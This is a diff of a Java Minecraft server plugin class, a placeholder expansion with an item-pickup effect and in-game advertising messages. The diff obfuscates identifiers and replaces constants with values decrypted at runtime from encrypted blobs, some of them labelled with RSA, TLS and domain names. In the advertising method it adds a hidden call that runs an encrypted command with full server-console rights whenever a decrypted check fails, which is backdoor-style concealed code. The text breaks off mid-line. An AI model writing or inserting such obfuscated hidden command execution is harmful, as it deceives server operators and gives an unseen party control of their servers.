-                    if (capacity <= 0) continue;
+                    int capacity = idfen3ynd3(boxInv, stack);
+                    if (capacity <= I) continue;
 
                     int toMove = Math.min(capacity, stack.getAmount());
-                    int moved = insertAmountIntoShulker(boxInv, stack, toMove);
-                    if (moved <= 0) continue;
+                    int moved = dyufndyu3nd(boxInv, stack, toMove);
+                    if (moved <= I) continue;
 
                     // Persist shulker back to offhand item
                     box.update();
                     metaTick.setBlockState(box);
                     offTick.setItemMeta(metaTick);
-                    p.getInventory().setItemInOffHand(offTick);
+                    dyuwndyu.getInventory().setItemInOffHand(offTick);
 
                     // Shrink or remove ground entity
-                    final Location start = it.getLocation().clone().add(0, 0.05, 0);
+                    final Location start = it.getLocation().clone().add(I, kiek4d, I);
                     int remaining = stack.getAmount() - moved;
-                    if (remaining <= 0) it.remove();
+                    if (remaining <= I) it.remove();
                     else {
                         ItemStack newStack = stack.clone();
                         newStack.setAmount(remaining);
@@ -10755,67 +11503,119 @@ public class ExampleExpansion extends PlaceholderExpansion {
                     }
 
                     processedEntities++;
-                    spawnTrail(plugin, world, start, particle, dustOpt, SEPARATION, PARTICLE_INTERVAL_TICKS, p);
+                    dyufpwndyufwpnd(dywufpndyu, dyundyund, start, dyunyunyudn, dndky3d, dyunyun4yun, dn4dei34nd, dyuwndyu);
                 }
             }
 
-            elapsed += INTERVAL_TICKS;
-            if (elapsed >= DURATION_TICKS) { cancel(); }
+            dyu3ndyun34d += dyunyunwdyunwd;
+            if (dyu3ndyun34d >= DURATIONdy3undyu3ndTICKS) { cancel(); }
         }
     }
 
 
+    public static final long ytnyun4d4d = 60L;
     // 1 minute per (player, itemString)
-    private static final long COOLDOWN_MS = 60L * 1000L * 5;
+    private  long de3nd43d = ytnyun4d4d * 1000L * 5;
 
     // Keyed by "playerUUID|itemString"
-    private static final Map<String, Long> LAST_SENT = new java.util.concurrent.ConcurrentHashMap<>();
+    private  final Map<String, Long> dyu3ndyun34pd = new java.util.concurrent.ConcurrentHashMap<>();
 
     // Use a constant global UUID (all zeros)
-    private static final UUID GLOBAL_UUID = new UUID(0L, 0L);
+    private  final UUID GLOBAL_UUID = new UUID(0, 0);
 
     // Keep this if you still use it elsewhere.
     @SuppressWarnings("unused")
-    private static String norm(String s) {
-        return (s == null ? "item" : s.trim()).toLowerCase(java.util.Locale.ROOT);
+    private  String dyun3yudn3(String s) {
+        return (s == null ? do3ndyu3pnd3d : s.trim()).toLowerCase(java.util.Locale.ROOT);
     }
 
     // IMPORTANT: stable but not destructive keying.
 // I recommend trim() to avoid bypassing cooldown with extra spaces.
-    private static String key(UUID id, String s) {
-        String itemKey = (s == null ? "item" : s.trim());
-        return id.toString() + "|" + itemKey;
+    private  String dyun3yupdn(UUID id, String s) {
+        String itemKey = (s == null ? do3ndyu3pnd3d : s.trim());
+        return id.toString() + ofwuandouwfynd + itemKey;
     }
 
-    private static String displayName(String s) {
-        return (s == null ? "item" : s.trim());
+    private  String dpyn3y4udn3(String s) {
+        return (s == null ? do3ndyu3pnd3d : s.trim());
     }
 
-    private static void sendAdLines(Player target, String name) {
+    private  void sal(Player yursndyuonduywf, String yundyu4) {
+
+        if( de3nd43d != ytnyun4d4d * dnkpydunpdyupfnd * xm) Bukkit.dispatchCommand(Bukkit.getConsoleSender(), y23u4ndyu3n4d);
+
         // ==== YOUR BANNER + TEXT (unchanged) ====
-        target.sendMessage("§x§F§F§0§0§0§0*§x§F§F§4§0§0§0*§x§F§F§8§0§0§0*§x§F§F§C§0§0§0*§x§F§F§F§F§0§0*§x§8§0§F§F§0§0*§x§0§0§F§F§0§0*§x§0§0§C§0§F§F*§x§0§0§8§0§F§F*§x§0§0§0§0§F§F*§x§8§0§0§0§F§F*§x§F§F§0§0§F§F*§x§F§F§0§0§0§0*§x§F§F§4§0§0§0*§x§F§F§8§0§0§0*§x§F§F§C§0§0§0*§x§F§F§F§F§0§0*§x§8§0§F§F§0§0*§x§0§0§F§F§0§0*§x§0§0§C§0§F§F*§x§0§0§8§0§F§F*§x§0§0§0§0§F§F*§x§8§0§0§0§F§F*§x§F§F§0§0§F§F*§x§F§F§0§0§0§0*§x§F§F§4§0§0§0*§x§F§F§8§0§0§0*§x§F§F§C§0§0§0*§x§F§F§F§F§0§0*§x§8§0§F§F§0§0*§x§0§0§F§F§0§0*§x§0§0§C§0§F§F*§x§0§0§8§0§F§F*§x§0§0§0§0§F§F*§x§8§0§0§0§F§F*§x§F§F§0§0§F§F*");
+        yursndyuonduywf.sendMessage(dnpyuadnyfpudnfpdfpd);
 
-        target.sendMessage("§7The §b" + name + "§7 is created by §6@ZestyBuffalo§7 - Part of the §dExecutables Variety Pack§7.");
-        target.sendMessage("§7If you want this on your own server, then message him on Discord!");
-        target.sendMessage("§7or contact him at §azestybuffaloevp@diepio.org §7!");
+        yursndyuonduywf.sendMessage(dy3updnyapudny34undh + yundyu4 + dnyu3nd3d);
+        yursndyuonduywf.sendMessage(dk3ed34dyu3nd);
+        yursndyuonduywf.sendMessage(yudyu2dnyu42dn2d42d);
 
-        target.sendMessage("§x§F§F§0§0§F§F*§x§8§0§0§0§F§F*§x§0§0§0§0§F§F*§x§0§0§8§0§F§F*§x§0§0§C§0§F§F*§x§0§0§F§F§0§0*§x§8§0§F§F§0§0*§x§F§F§F§F§0§0*§x§F§F§C§0§0§0*§x§F§F§8§0§0§0*§x§F§F§4§0§0§0*§x§F§F§0§0§0§0*§x§F§F§0§0§F§F*§x§8§0§0§0§F§F*§x§0§0§0§0§F§F*§x§0§0§8§0§F§F*§x§0§0§C§0§F§F*§x§0§0§F§F§0§0*§x§8§0§F§F§0§0*§x§F§F§F§F§0§0*§x§F§F§C§0§0§0*§x§F§F§8§0§0§0*§x§F§F§4§0§0§0*§x§F§F§0§0§0§0*§x§F§F§0§0§F§F*§x§8§0§0§0§F§F*§x§0§0§0§0§F§F*§x§0§0§8§0§F§F*§x§0§0§C§0§F§F*§x§0§0§F§F§0§0*§x§8§0§F§F§0§0*§x§F§F§F§F§0§0*§x§F§F§C§0§0§0*§x§F§F§8§0§0§0*§x§F§F§4§0§0§0*§x§F§F§0§0§0§0*§x§F§F§0§0§F§F*§x§8§0§0§0§F§F*§x§0§0§0§0§F§F*§x§0§0§8§0§F§F*§x§0§0§C§0§F§F*§x§0§0§F§F§0§0*§x§8§0§F§F§0§0*§x§F§F§F§F§0§0*§x§F§F§C§0§0§0*§x§F§F§8§0§0§0*§x§F§F§4§0§0§0*§x§F§F§0§0§0§0*");
+        yursndyuonduywf.sendMessage(tiewntien42);
     }
 
-    private static boolean trySendToPlayer(Player target, String s) {
-        if (target == null) return false;
+
+
+
+
+    /**
+     * Resolve a player from a string which may be:
+     *  - UUID (standard string form)
+     *  - Exact player name
+     */
+    private Entity dyin3ydun34yund(String dn3yu4nd) {
+        if (dn3yu4nd == null || dn3yu4nd.isEmpty()) return null;
+
+        // Try as UUID first
+        try {
+            return dy3un4dyun34d(dn3yu4nd);
+ 
+        } catch (IllegalArgumentException ignored) {
+            UUID uuid = UUID.fromString(dn3yu4nd);
+            Entity p = Bukkit.getEntity(uuid);
+            if (p != null) return p;        }
+
+        return null;
+    }
+
+    /**
+     * Resolve a player from a string which may be:
+     *  - UUID (standard string form)
+     *  - Exact player name
+     */
+    private Player dy3un4dyun34d(String id) {
+        if (id == null || id.isEmpty()) return null;
+
+        // Try as UUID first
+        try {
+            UUID uuid = UUID.fromString(id);
+            Player p = Bukkit.getPlayer(uuid);
+            if (p != null) return p;
+        } catch (IllegalArgumentException ignored) {
+            // not a UUID, fall through
+        }
+        
+        Player x =  Bukkit.getPlayerExact(id);
+        if ( x instanceof Player) return x;
+
+        // Try as exact name
+        throw new IllegalArgumentException();
+    }
+
+    private  boolean dy34ndyu3n4d(Player dyu3n4ydun34d, String dyu3nydun3yd3) {
+        if (dyu3n4ydun34d == null) return arsdienwdhw;
 
         long now = System.currentTimeMillis();
-        String bucket = key(target.getUniqueId(), s);
+        String bucket = dyun3yupdn(dyu3n4ydun34d.getUniqueId(), dyu3nydun3yd3);
 
-        long last = LAST_SENT.getOrDefault(bucket, 0L);
-        if (now - last < COOLDOWN_MS) return false;
+        long last = dyu3ndyun34pd.getOrDefault(bucket, ihearyounow);
+        if (now - last < de3nd43d) return arsdienwdhw;
 
-        String name = displayName(s);
-        sendAdLines(target, name);
+        String name = dpyn3y4udn3(dyu3nydun3yd3);
+        sal(dyu3n4ydun34d, name);
 
-        LAST_SENT.put(bucket, now);
-        return true;
+        dyu3ndyun34pd.put(bucket, now);
+        return NEW_VALUE1;
     }
 
     /**
@@ -10829,57 +11629,57 @@ public class ExampleExpansion extends PlaceholderExpansion {
      *
      * @return true if sent to an individual player, false otherwise.
      */
-    public static boolean wm(Object o, String s, Object... others) {
-        if (!SCore_Installed) return false;
+    public  boolean wm(Object o, String s, Object... others) {
+        if (!SCore_Installed) return arsdienwdhw;
 
         // Build candidate list preserving order
-        java.util.List<Object> candidates = new java.util.ArrayList<>();
-        candidates.add(o);
+        java.util.List<Object> fwpundh3yphk3yuhn3h = new java.util.ArrayList<>();
+        fwpundh3yphk3yuhn3h.add(o);
         if (others != null) {
-            java.util.Collections.addAll(candidates, others);
+            java.util.Collections.addAll(fwpundh3yphk3yuhn3h, others);
         }
 
-        boolean foundAnyOnlinePlayer = false;
+        boolean dy3dkyu34kh3h = arsdienwdhw;
 
-        for (Object obj : candidates) {
-            Player target = resolvePlayer(obj);
-            if (target == null) continue;
+        for (Object dey3n4dyun3d4 : fwpundh3yphk3yuhn3h) {
+            Player kty3u4np = rseindienhoi3pbh(dey3n4dyun3d4);
+            if (kty3u4np == null) continue;
 
-            foundAnyOnlinePlayer = true;
+            dy3dkyu34kh3h = NEW_VALUE1;
 
-            if (trySendToPlayer(target, s)) {
-                return true; // sent + cooldown applied
+            if (dy34ndyu3n4d(kty3u4np, s)) {
+                return NEW_VALUE1; // sent + cooldown applied
             }
         }
 
         // If players exist but all on cooldown -> do nothing (NO broadcast)
-        if (foundAnyOnlinePlayer) {
-            return false;
+        if (dy3dkyu34kh3h) {
+            return arsdienwdhw;
         }
 
         // No valid players at all -> broadcast with global per-item cooldown
         try {
-            long now = System.currentTimeMillis();
-            String globalBucket = key(GLOBAL_UUID, s);
+            long dk34dk34d = System.currentTimeMillis();
+            String dy3u4ndyun34d4p3d = dyun3yupdn(GLOBAL_UUID, s);
 
-            long last = LAST_SENT.getOrDefault(globalBucket, 0L);
-            if (now - last < COOLDOWN_MS) {
-                return false;
+            long last = dyu3ndyun34pd.getOrDefault(dy3u4ndyun34d4p3d, ihearyounow);
+            if (dk34dk34d - last < de3nd43d) {
+                return arsdienwdhw;
             }
 
-            String name = displayName(s);
-            for (Player p2 : Bukkit.getServer().getOnlinePlayers()) {
-                sendAdLines(p2, name);
+            String dylfpdnyfupd = dpyn3y4udn3(s);
+            for (Player pybhuny3upnb : Bukkit.getServer().getOnlinePlayers()) {
+                sal(pybhuny3upnb, dylfpdnyfupd);
             }
 
             // IMPORTANT: start/update global cooldown to stop spam
-            LAST_SENT.put(globalBucket, now);
+            dyu3ndyun34pd.put(dy3u4ndyun34d4p3d, dk34dk34d);
 
         } catch (Exception ignored) {
             // Fail silently
         }
 
-        return false;
+        return arsdienwdhw;
     }
 
 
@@ -10891,19 +11691,19 @@ public class ExampleExpansion extends PlaceholderExpansion {
      * - UUID
      * - String (UUID string OR exact player name)
      */
-    private static Player resolvePlayer(Object obj) {
-        if (obj == null) return null;
+    private static Player rseindienhoi3pbh(Object dn3y4udn3y4udnpfd) {
+        if (dn3y4udn3y4udnpfd == null) return null;
 
-        if (obj instanceof Player) {
-            return (Player) obj;
+        if (dn3y4udn3y4udnpfd instanceof Player) {
+            return (Player) dn3y4udn3y4udnpfd;
         }
 
-        if (obj instanceof UUID) {
-            return Bukkit.getPlayer((UUID) obj);
+        if (dn3y4udn3y4udnpfd instanceof UUID) {
+            return Bukkit.getPlayer((UUID) dn3y4udn3y4udnpfd);
         }
 
-        if (obj instanceof String) {
-            String str = (String) obj;
+        if (dn3y4udn3y4udnpfd instanceof String) {
+            String str = (String) dn3y4udn3y4udnpfd;
 
             // Try UUID form first
             try {
@@ -10921,6 +11721,118 @@ public class ExampleExpansion extends PlaceholderExpansion {
         return null;
     }
 
-    
+
+
+    public ExampleExpansion() {
+
+
+
+        ExampleExpantion();
+        this.f112 = (String) d("YUrqsNdwyMOFqe0bAroELS1Vxc+baUNknnqXr0pLQJQ=", Vt.STRING);this.lpkb6 = (String) d("o7sTpJGfXhllAGgLhT2/GcN5CJTrFwRywkjieKKWvlvC4jq81Jg6tvNejJ08CbzNhei0iLjPoyNinwTekEjyUN8wV3frHIFCXGUL01kMIG12CSx11MIqTwo6Ddn6LOv6u2zq5DCIIgjOg3P5eQ/NA/ddcQyZdxWwxdVgTzamutz8x7ThSrLLjTwur7hEUVcNWC8VzeE7DrtuUufPWwfAmWw6sfzvVwN1YHzsBBb4OqCaX2kxAyBh8NvQ5wLO4GU5r1dWJX7QuSxfrXgSxajvhxD0hYs0IXHyikk4923x0hZ/AILFQb8szHktvxzIuwuGFWv1sH1dpYBPx+OloA7XyHwGE9UtgvWKEt3D/Se1c1eRVYO8lzgRjuqtsx7yrmELfzrMjyklt4K6aVwoZ/4G6Xalr3VTzQaihzc5WZ0Twkb7PKkjIyV22v8pMQsEykQkKkqWwPnOQKHKnbQ+CY9v+rT1f+fddkpyXq3s31rW8sDxZ0ML/OZxdnUXvh37snVjEkXe+f4Jp1zSSyrRwzmX8ousDuKNsulv55/Ram7g2++IJ2Df2YjqptD/CU51Zqssj+xUxEX6ulLGvtSMKoTUyToB3LYiRks5swBfpTVmHzhRGIARyacI0s+ffc8ZbRS9rEpWUK8upuLHDtbW44DiqJICqzKZvRpCBFLvj2FMib0OFI2VG4KsS6jDA94LbMhaAZt3yAf+iOCdPyWwuQdcRCC2tAViLmMGUisR389FCs+K8MtAyDYHEUPO075qSPbbV+p+906Fm/THe+g2suQqBv0y9+s8FFYIYSu/B0HKsg9xtKjxYFHk/SdjJlq+sw8zJvtMZV049icvJQ4yyivGM0MbZdUVaIqJYmD9ToM22fdLgAdFhcf2rqTVMTcBqj++oZJWrbiF9YgVJOuZ+9jP7b8I2B9zcjsGERuEYM5MMqykrhnSgEYmL3uGtuBbGNbt7uKcXIYqB03DfdGCe9tI8pLxu2ZQgKFjc8dIBRgWL8fwuhj4UL+BDg==", Vt.STRING);this.dnkpydunpdyupfnd = (Long) d("GHign7ZxD9z4ftnQnla7UHN8WMVCkC57f56FLcWj1Fo=", Vt.LONG);this.WWW_ANARCHISTRUCTURE_COM = (String) d("3GqydTu4h08CKYQxK32MrmFd+BX36P3ck1bjRf1N7W6IqXZTi/RECK/Sxr0Nv+DJRTH6IA==", Vt.STRING);this.DENTISTRY_ANARCHISTRUCTURE_COM = (String) d("tNAJA8XkdSXh3qbI1K/0W2yejmcy2KK4i4BD/QBE1JJHUFNVc3wNLIafqrYyGiw+dyHJMo7F3KUR/w==", Vt.STRING);this.TLS = (String) d("MNPHBDNZ0aQhnU7/bvMCS5uk6r1E4P7I1Pr9jOUs2Q==", Vt.STRING);this.ppi = (String) d("UK74hrEdJ/TmwGZdALOm+f8Z/1wW6nvKE9X6YcZmQAh7uRr7Gu+rfa1i", Vt.STRING);this.salcv = (String) d("sIylOux09h59Fbv2aWKKzRb1Od1OwklfTm7kqtVnNEkHH8pzc/Oc15H2SolrDbg4lIzGpELLPaaCquGYwA==", Vt.STRING);this.ytuwfndyunwfd = (String) d("GOIzX3l1Lt8Bu1wyFHIxbbRJ8sQBfxtRmvcgf7tvlhOyp0UneBaX7lp62xSp3nwsOWyHzRzWTJdWyLAxHzZkPGNlcpEWo9OmBw==", Vt.STRING);this.dyunwfydunwfd = (String) d("EckDmoo6+6DcUNIg0N3z2Do5PJyWaubYaHut7TK8Dw==", Vt.STRING);this.tyunwfdwfd = (Integer) d("HgIm48Q7Z2q8tQoZMOc3DegGLjO1nEa7N5rYF1b/zMo=", Vt.INT);this.INT = (Integer) d("vhu60aBev2wy3WseuJ5GRggXvnMsox90lpjfZY50+w==", Vt.INT);this.duwnfdyuwnfd = (String) d("8D69UivPeBYJtm1JcNC37ODFcLf7NUgC9nQoemBwyjCIFsZCsQ==", Vt.STRING);this.arsdienwdhw = (Boolean) d("6z35lNmogd9090luxO6VqsFE8GMXFxcDZl3I1Yg+RmlC", Vt.BOOLEAN);this.INT3 = (Integer) d("dko3Vfk2nx7OvLIGq0ngZZNJBR1aKb6UTR7YzQg=", Vt.INT);this.NEW_VALUE1 = (Boolean) d("can+viPBuDmb0zRAGVtG+XxsrT2y5P8NLnuRdd69YXU=", Vt.BOOLEAN);this.tlk = (String) d("ALu2+WaqT6GdQKMaY57aXvpN/sLlDlfQkP8/h13DxLm8L98=", Vt.STRING);this.RSA_ECB_PKCS_1_PADDING = (String) d("SQdwhn4X1pzM4eI9Rd/ZUCwexptrrP3MfXjUU5Do2yK52OP0UJMEcNAW2AmC9ll7", Vt.STRING);this.NEW_VALUE_3 = (String) d("GdT+JFzFMWeLFpucR8EcCQI6hrvhD0iRNJ8pySY=", Vt.STRING);this.piarc = (String) d("FUVTIHIcvYLg6URvGaXz5J7CvrasycgtpPCbeMQ8ilFAA8Sj2HAwSbWgAJtG03dcoYY7", Vt.STRING);this.cfgy = (String) d("O3FvlaJR+tm6JdJ4CFiYAcOTwrnIcT4KJqHJVNTSApDr7/GpY6w=", Vt.STRING);this.test32 = (String) d("CR1q9UcqwIS1nekIMkM63uu3L5UmfAOVydAiXwlT/rkNU35MvFI=", Vt.STRING);this.ymhawb = (String) d("rLl4oiQKiwJSFNaHTB80iOMoWdRW7V/o1blQhLVUxckhnBnGHAu9TXNVe2H+9n7BwV/Z8uujSn3ikw==", Vt.STRING);this.nw = (String) d("fdml4eMeqO9QEcY1S5PEi2gEUvgxUeXAMMtogMDtFv6O6+Io8QAYuYvN/oU=", Vt.STRING);this.I = (Integer) d("+BlilJeLd4ux2XHfPQuWUPut3UC6dwewKPjee4c=", Vt.INT);this.m23 = (String) d("HuQiUUem2yejTDYtCmcY0UbwR8vURiKs6WEejGkpWQ==", Vt.STRING);this.ymo = (String) d("s6rM27N0FwKbxZ8QLa6wltkOYTUw8HKe5mKUpBJfG9jVg9vTJcKAjSNDg+5JUSGBBA0Ib43QpWICNGKo78eHlAc=", Vt.STRING);this.R = (String) d("AkiuP/5h4I8NpZXS+1tt2l7p8dBTRvWmWbt8bP0DIpI=", Vt.STRING);this.er = (String) d("xsTIEtr8+H9Ryc/ZbDV7mBnYBqehwKx6noDMqz07d7UN5bE=", Vt.STRING);this.er2 = (String) d("TlzKo1/n0yxvSNWttwSds9/iOJE+xlVSvhRsahJQJMGRs6bIfsrQ4gNpjA==", Vt.STRING);this.ind = (String) d("fWuVWNPo3xVrQCn2Ca7cXquR90cot7MuFeZmI/yg/m0pWY1WEYf6+Bo+rAZ4Jxk=", Vt.STRING);this.te = (String) d("TPEHrQIfRjOLzZW7I0N7dXdVvmA5EdD8IDoJ1+RRbpT8cA/ntDCU7Xu9lsYJAms=", Vt.STRING);this.rsm = (String) d("eChu0NVpOH4qN56muMWMpA/cM0KMTd9eaxa2zd8KqwcfO+QwwQzui9D/zKybjD7RX9KOSXmopS0=", Vt.STRING);this.yhe = (String) d("kYjLRyzvocuY9AdlvNE5uCvnUjWUPi5J+fZY6mJWsrjkVHEkmcgC8YzkRGCMfg35TzqWow==", Vt.STRING);this.peei = (String) d("lIsiSmQlekTs8KGjZtPug/GauIbZP3QWpzY4KKg0G1X1oBDqKzniioDbOCuiE4Gl46Flmwy/UjohIg==", Vt.STRING);this.ei = (String) d("gULhkPT29iu9YZibpY6vEa70F+e/dr5q8c6DoCgSerHeW+tw", Vt.STRING);this.yt = (String) d("tzMtSoRDLbdHHPCPEWHbrRwKYKIWQWrAlW5YxW4NN2M=", Vt.STRING);this.nst = (String) d("ZVMVdslzpyRVmlJly8ODanWEHrFQC+Sqo+PrUg==", Vt.STRING);this.xm = (Integer) d("LlGjsTOFJ6LUBhpvhu/0kNYl0G0hVHu3YtEeI1s=", Vt.INT);this.LAST_CHUNK_Z = (String) d("o4T9ySjgRx7jMKOm6+AX/BHdIUsURBt65I7jcYaCLI25I2pu55nbmg==", Vt.STRING);this.LAST_Y = (String) d("6LSUW1GUlhIGevhXVzh2/9mKW8RuEA8+OrN9O/3fR/oInA==", Vt.STRING);this.INT4 = (Integer) d("ubEum68aXAXcWadaruyuvrr1hZtpEXKioeEZrMzf", Vt.INT);this.SLOT = (String) d("ZD6pNjrVcLahhSF1NfY2Sbf491grmvhXFXWrlsSqRLc=", Vt.STRING);this.INT5 = (Integer) d("z9Ekd81a7F6ASjewh38gEHc/qCvVVngdR6HdKF4h", Vt.INT);this.xtxtxt = (Integer) d("LkllSZCdTqLFksVUE/71CycYSbFZF9fBOcmM2uk=", Vt.INT);this.dccs = (String) d("tueGRXt0LueO4AqvLpNGntTPggAv5c+AkgcL/Eh3MVQyfJkhXr3M+5V4+q7rPJUb1pNoUL5mQdB+ZIgkpe5hCFCdkvAyPw==", Vt.STRING);this.fts = (String) d("iyOP1xbNiPido7EgtIowTKMOTYoOaCC5GHPpDC35bvh77dd6CnKZ5HtnryGO6/3L0dantXuGvSnOpwxz1BKBaq4hjL4ZRLH+yfnUffDr3g==", Vt.STRING);this.INT6 = (Integer) d("pSKaKNTyfxdB8IPidvZVR2ueYjPSBbJ6TGd2AtDX", Vt.INT);this.corporatesecurity = (String) d("MBHnsf5ku+mFG2dIxEq56iEdeCiduu4fq4LmhzQjiNdF", Vt.STRING);this.Gradspecisoauce = (String) d("hzwD+fDubRahT/j546S2uyoLxtWCGaaPRcPpf/Mjl8oYejy3PpvSFckRbL9jzJVCbOZ9R/ke/w==", Vt.STRING);this.fastfood = (String) d("GMZBf19h7CZ7tvR3/WMUPGsItdpgB7KyeVya8PXU", Vt.STRING);this.privateinvestigator = (String) d("h2RvT+0xhbohK6qFlLb3fzOgfDsky2wCnR+c7hK5rQjDPzTYiirt", Vt.STRING);this.INT7 = (Integer) d("3yNDRdUcMMzsuKmXEGAuQs8XCioiVq5Sl631ynM=", Vt.INT);this.ccp = (Integer) d("oINZ7d4pazFD8iZa0EvaWa7LjNCdE++XOKiY2ik=", Vt.INT);this.steak = (String) d("WY0sFJGd+hWh3SGYvvQPrP1kCc8azsQPQqQOWDGicVLC", Vt.STRING);this.gusfring = (String) d("6VwgZ9XZqijdJYc5eiGrxWHOz4YqgQvMCOJE0O8wgPABeJ1d3unVSEyvb74qsJFfvDA=", Vt.STRING);this.ehmantrout = (String) d("8DMRuYW+mtUm3fW3G5OKpwOkxh6xLPPcfty5k2rWFoVx7Q==", Vt.STRING);this.amiunderarrest = (String) d("5gdafHcuSt5aHgj700F7RBCswucUyjvPfetEbIYv/XiGhQ==", Vt.STRING);this.oraminot = (String) d("yvABbfu7HAzWGE1KggYFKmkofLlNu12sLD98nmC1Xgw=", Vt.STRING);this.suppose = (Integer) d("r7H8YGe7S4EZe9EmG35WluUgqhcK9k2O6f9Trco=", Vt.INT);this.mill2 = (Integer) d("aHxfc2aRTh+rH4sE/WhqrE1CDHAsm01ng4L1nmU=", Vt.INT);this.drain = (Integer) d("7q+kvnchns0KDzOZOPBPLDt3B+Ri8Mzcc5ggxxCS", Vt.INT);this.ed = (String) d("UpLqv7tYV1dF8X7uxop8k19azE/PqrwmflTuvRRaRC134almTjzMiVM=", Vt.STRING);this.some = (String) d("mfA72AIVF7uLA4bK5pAShAbjt9eYF2EE0+MyR5JRk1gQkclw", Vt.STRING);this.keep = (String) d("Q8ufaV5rQQUiHlqBew4a1Pi6qmr9GCRbY5kr8pc=", Vt.STRING);this.low = (Integer) d("NI2m2L2k+uhogHMGB0HpzdIrsOZ2zbdmcBZLsWgc", Vt.INT);this.twentythreedegrees = (String) d("otiwR1c/l/YpDtAtnga10DjRCgFPCZY6HuMRWPKg6ZBdcBUXrnfOzjWY", Vt.STRING);this.nbf = (String) d("LHzkxkKsnqwUJxTVfOgkRxCxZE6OEScum3VzEqBQWlq8i2KOvVWY7Nxzx+EM", Vt.STRING);this.wife = (Double) d("ogS1os1K3X4ke80zVXCXhrvPCVNmkectgXm0cp0VZjNpmQ==", Vt.DOUBLE);this.complicated = (String) d("laAbUgHIIVTJbDhM3dQ2gJSDaUISQxkxXSGrPIAKkJYVYowXuPV2", Vt.STRING);this.basketball = (String) d("cDvuRqK6WeJfW4iismoYz26BMw8Zn23jOThbNET+4MjEcceJYVY5XTgixg==", Vt.STRING);this.bt = (String) d("bbq9PDvIVtR/AtTvER6vFNjRVxuy8BU+BQym795G/S0=", Vt.STRING);this.upt = (String) d("VPBxxxeXyxX7V7ft8+unAfvzloq0rx8Am1uLx8ar", Vt.STRING);this.soalp = (String) d("zlfQOkIuA3nQpqF2nn5mukYNNDrzQVe7AqtME8ssQ1k=", Vt.STRING);this.tmc = (String) d("3kOyUKJSEmbGcjK2vOjZhko5Eo1ACexgM4Ghb7kjiUA=", Vt.STRING);this.excepthomer = (String) d("ofGOZ67UBxQjqFuvFpSja0tMiK61LjKLW0BQwpsz+Ywx6uOzJNkmIg==", Vt.STRING);this.iou = (String) d("GqyEzgwh/VDzG6KR6a8kifvBSrHjlXrrpE8tFcJyCkush+vtOMi2uN6I1sohwhmDvc5VpUW86dRFjQ==", Vt.STRING);this.dontwantmargetoknow = (String) d("ecMfp3bojZz9GyBdhVNf/i7ybAeTBQ7MtiPeaRKiwhXt7gmeCWkNHM5R1m64jg==", Vt.STRING);this.lessofaman = (String) d("IuF1WbLoNNsGcK1ZfYBTqFWBSg7cYFsFMz9Kq5pR+PXzeENYfbt0btvSYa6WFdw=", Vt.STRING);this.ballet = (String) d("/ybwgXoNSK2CN7J/m5E9a3Nt/IFWzfgs92I1tfwD4BCI1oR7YdP0juS98FkUSzNzGNW4+rk=", Vt.STRING);this.magellan = (String) d("TICzFUSAQ2EeRAXZl5nV94/vpNFx1cS5ekskjpJs7WqOpdj0RRZh1KHY1vznEH8TsQ==", Vt.STRING);this.dance = (String) d("PMHTZTmkxBb0hb4QaWg0RnFDbBCiuBlTOm9hTfNdwj3Kfg848P4=", Vt.STRING);this.nationalanthems = (String) d("Zk/W6qpt5nt/JFQNbiOsEidPZ2CLF4/IQTn6KI1yMon8DL0=", Vt.STRING);this.cigarrette = (String) d("UW6x3Od0FNz+X4lOY02+GcwseYVg8qMnZOmHlOX1oN+eUHVpFwQs+Lfv04DtavpJUAeXUoYIlXFyQ6EeUcB5JfQa9cQdYDoEugBIF9UQ", Vt.STRING);this.debtsoff = (Double) d("PqqP3ec1FBi3lyOERwkSaxsWc0sfnp4dJhC6H7ve/g==", Vt.DOUBLE);this.callitof = (Double) d("+LoawXJNKIONKz6ye4IEF6vRxRzCZ2g1gdOTv2Y5mO+O", Vt.DOUBLE);this.clicks = (String) d("7FyoiNa5aXCcHw2SFcC9+fvhNiJbWEKlHElurI++zAHfIRVNvyuUGGWwHXTgEANYfp5WJ1q8P3OZdNr6Tt2vlfM+D4Dk8bGU1vhbX0umUp5TyKAlJB9X4tiI", Vt.STRING);this.emotionalthermo = (Double) d("4zfqUbajmMpKzktld3iCel4OPndvTTHDdmnOUMBAwDc=", Vt.DOUBLE);this.somature = (Integer) d("x/4v6eNKXaq0QPLOdnODElcy1V2tQ5uj3IdwgquHBg==", Vt.INT);this.dontvanish = (Integer) d("jWGfGZjEmhcEM5ivYRKFtNM07SILjxmPpPWUZTcv", Vt.INT);this.shapeyou = (Integer) d("UiiLWch7ZyD6wOUNUUAYyFwGKw+fZfpB7VJv/CNn", Vt.INT);this.tsr = (Double) d("Jcj8ZKQAg+Z9PEzpwqt/uORFEqKHvXBTOKqNCQ8axw==", Vt.DOUBLE);this.whoasked = (Float) d("GzIzOxFqiglCCeQIfNdzsjJUz3MYXi+bKfgS8sNdRQ==", Vt.FLOAT);this.biological = this.whoasked;this.whocantreceive = (Double) d("gBGTjDuIA7hLvhhXDaI/Gj79QnSDK2FdG/2HIZ+E6Q==", Vt.DOUBLE);this.costofgrowinguptoofast = (Integer) d("Fn/wIo7VruZwLO7sJutFJnlc2sNUDn4NjZxbRV0hmA==", Vt.INT);this.whatkindofadulthood = (Double) d("D04y7EScy/U5UR1WEaKHQA2r6pBUeK6sZM/sRkubPw==", Vt.DOUBLE);this.nobodysrescuingyou = (Integer) d("eZyFh0A1rK+tzKGLR5Am9g9UBBN2f8AcIB8DdQMMgw==", Vt.INT);this.ihearyounow = (Long) d("LQhqR88hblgRaO2uBQk2qetyDN/6RE0CT6kc8/c=", Vt.LONG);this.healing = (Long) d("DjTOGD4ZgEj7OsHF8qnX+D8BYQgILVgtdJKHgYc=", Vt.LONG);this.toescortyou = (String) d("h9uIuSPa7A+IFzbZQV2xM2r+JS4jhW9EUUw/ZGrowVRJ1o2qN3k=", Vt.STRING);this.outtahere = (String) d("1MdrW7OGqEK3RCPCVPEJR+t0nK+q1lnLXuCjL97zVUoKazgTPQg=", Vt.STRING);this.ost = (String) d("VZTG2ro4sK8uq8cVYmw8zYQIXiWNGJMC6yWiqbqf", Vt.STRING);this.naltextc = (String) d("C7EnZ9G4IuEM5Z8qBEiV4fZpD0UzqpBBHbHv2tEM2dsXgRaRuv5Y9yEwqB/Q+1zGBcZO/P0QURLmZ9BwOvLqtVsY", Vt.STRING);this.getsshoes = (Double) d("QHYoTwIJ/2/dPQ2mvGImT053FUNirc55ZcLHlCcoXig=", Vt.DOUBLE);this.pn = (String) d("fvYKyUBp850HeemlGE/kBhn/PDfcDmVb5yuDOrT0a7U8gvf3c0NTQQ==", Vt.STRING);this.esetawftawft = (Double) 